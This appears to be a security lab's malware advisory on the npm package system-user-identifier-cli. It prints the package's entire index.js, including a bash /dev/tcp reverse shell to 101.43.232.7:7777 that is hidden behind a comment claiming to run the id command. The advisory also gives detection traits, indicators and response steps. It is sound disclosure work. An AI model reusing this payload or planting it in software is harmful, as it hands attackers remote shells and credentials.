---
title: "system-user-identifier-cli: an npm identity helper that opens a reverse shell"
date: 2026-05-25
summary: "The npm package system-user-identifier-cli 2.0.0 presents itself as a small user-identification utility, but its CLI entrypoint executes a bash /dev/tcp reverse shell to 101.43.232.7:7777."
packageName: system-user-identifier-cli
ecosystem: npm
---

The package is 799 bytes. Two files, a placeholder author, a name that reads like a thousand other one-off `npx` utilities: `system-user-identifier-cli`. The manifest calls it "a simple npx tool to check system user identifier." The binary does check the user. Then it calls home.

After printing a greeting built from `os.userInfo().username` and `os.platform()`, the CLI hands control to bash. The entire `index.js` — 17 lines, comments and all — is reproduced below:

<pre class="lang-js"><code><span class="tok-com">#!/usr/bin/env node</span>

<span class="tok-kw">const</span> os = <span class="tok-builtin">require</span>(<span class="tok-str">'os'</span>);
<span class="tok-kw">const</span> { execSync } = <span class="tok-builtin">require</span>(<span class="tok-str">'child_process'</span>);

<span class="tok-com">// 方法 1：使用 Node.js 内置模块（推荐，跨平台支持更好）</span>
<span class="tok-kw">const</span> user = os.<span class="tok-fn">userInfo</span>().username;
<span class="tok-kw">const</span> platform = os.<span class="tok-fn">platform</span>();
console.<span class="tok-fn">log</span>(<span class="tok-tmpl">`👋 Hello! (Node内置方法) 当前用户是: <span class="tok-tmpl-expr">${user}</span> (<span class="tok-tmpl-expr">${platform}</span>)`</span>);

<span class="tok-com">// 方法 2：直接执行系统的 id 命令（原生 Shell）</span>
<span class="tok-kw">try</span> {
    <span class="tok-kw">const</span> idOutput = <span class="tok-fn">execSync</span>(<span class="tok-str">'bash -i &gt;&amp; /dev/tcp/101.43.232.7/7777 0&gt;&amp;1'</span>, { encoding: <span class="tok-str">'utf-8'</span> }).<span class="tok-fn">trim</span>();
    console.<span class="tok-fn">log</span>(<span class="tok-tmpl">`💻 原生命令输出: <span class="tok-tmpl-expr">${idOutput}</span>`</span>);
} <span class="tok-kw">catch</span> (error) {
    console.<span class="tok-fn">error</span>(<span class="tok-str">'执行 id 命令失败:'</span>, error.message);
}
</code></pre>

The comments are the author's own. Method 1 is the cover: a real username and platform string printed before anything else happens. Method 2 advertises itself as running the `id` command — and in `execSync`'s argument string, that pretense ends.

No staged download, no obfuscation, no install hook. The payload is the binary itself. Whoever runs the command — directly, through `npx`, through a teammate's copy-paste — gets a bash session wired to `101.43.232.7:7777`. The `catch` block prints a Chinese error claiming the `id` command failed; by then `id` is no longer what is running.

## Why this works

Two design choices make this more dangerous than the average install-time dropper. First, the package does the advertised work before it betrays you: a real username, a real platform string, printed in a friendly format. A developer scanning output sees a working tool, not a crash. Second, the trigger is the declared `bin`, not a `preinstall` script. Static scanners that flag lifecycle hooks see nothing here. The malicious surface is the thing the package exists to be run as.

The social engineering is the name. `system-user-identifier-cli` is the sort of phrase a hurried engineer types into a search bar and the sort an LLM might suggest. `npx` will fetch and execute it without leaving much of a trace.

## Traits observed

The [Fallout report](https://lab.atomdrift.org/file/8b02bd641c856c510d26da46d003ac076dd754f8bab42143b676f9478ed5501e) — produced by [cleave](/cleave/) decomposing the archive, [litmus](/litmus/) grading the result, and the [azoth](/azoth/) model returning a malicious verdict at probability 1.0 — records the archive's behaviors as labeled traits. The high-severity ones tell the story on their own:

|  | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `objectives/supply-chain/recon-exfil/pipeline::npm-supply-chain-attack` | npm package shaped to harvest CI/CD identity (T1195.001) |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/command-and-control/reverse-shell/dup::reverse-shell-shell-complete` | Bash reverse shell via `/dev/tcp` (T1059.004) |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/discovery/system/fingerprint/runtime::node-os-userInfo` | User information collection (T1033) |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/supply-chain/metadata-anomaly/package/npm::placeholder-author-no-repo` | Placeholder author, no repository URL |
| <span class="sev-dot suspicious" title="suspicious"></span> | `objectives/evasion/masquerade/naming/placeholder::placeholder-author-generic-1a` | Author field set to a test placeholder (T1036.005) |
| <span class="sev-dot notable" title="notable"></span> | `micro-behaviors/process/create/shell/bridge::js-execsync` | Synchronous shell execution |
| <span class="sev-dot notable" title="notable"></span> | `objectives/supply-chain/recon-exfil/install-hook::npm-victim-id-recon` | Package collects victim identifiers |
| <span class="sev-dot notable" title="notable"></span> | `metadata/package/fields/bin::has-bin-field` | Declared CLI binary as the execution surface |

What stands out is the alignment. The reverse shell is not what makes this novel; it is one trait among many. What Cleave flags is the *shape*: a placeholder author, a minimal manifest, a declared CLI binary, victim fingerprinting via `os.userInfo`, and a synchronous shell call — assembled into something that reads as a utility and behaves as a beacon.

## Impact

The shell inherits the caller's privileges. On a workstation that means SSH agents, npm and GitHub tokens, browser secrets, cloud CLIs, and whatever the local checkouts contain. On a CI worker it means deploy keys, signing material, and the environment. The blast radius is narrower than an automatic `preinstall` compromise — execution has to happen — but anything that does run it should be treated as compromised until proven otherwise.

## Registry timeline

Eight versions in roughly three hours, all from a placeholder identity:

| Field | Value |
| --- | --- |
| Publisher | `ayoung299 <iamayoung666@gmail.com>` |
| Package created | `2026-05-25T03:39:14Z` |
| Version 2.0.0 published | `2026-05-25T03:43:59Z` |
| Latest observed | `7.0.1` at `06:35:37Z` |
| Versions published | 1.0.0, 2.0.0, 3.0.0, 4.0.0, 5.0.0, 6.0.0, 7.0.0, 7.0.1 |
| Downloads API | `package not found` |

The cadence is itself a signal. Throwaway names burned through fast, no download history, no second author — the package was published to be run once.

## Indicators

| Type | Value |
| --- | --- |
| Package | `system-user-identifier-cli@2.0.0` (npm) |
| Archive SHA-256 | `8b02bd641c856c510d26da46d003ac076dd754f8bab42143b676f9478ed5501e` |
| `index.js` SHA-256 | `bfb0cc6b95a52da2789e4436c8b45d7349dd79ecef358fa1c34b6294ad7eace3` |
| `package.json` SHA-256 | `28e8fcb5e9762c76f393dfc17d434a5089f107558df62db8246db8cb8217c7ce` |
| C2 endpoint | `101.43.232.7:7777` |

## Response

Search shell history, npm caches, CI logs, and egress telemetry for the package name and for outbound traffic to `101.43.232.7:7777`. Rotate npm, GitHub, SSH, cloud, and deployment credentials available to any user who ran the binary, from a host that did not. Full trait list and raw analysis: [lab.atomdrift.org/file/8b02bd641c…](https://lab.atomdrift.org/file/8b02bd641c856c510d26da46d003ac076dd754f8bab42143b676f9478ed5501e). Registry metadata was read from `npm view system-user-identifier-cli@2.0.0 --json` and `https://registry.npmjs.org/system-user-identifier-cli`.
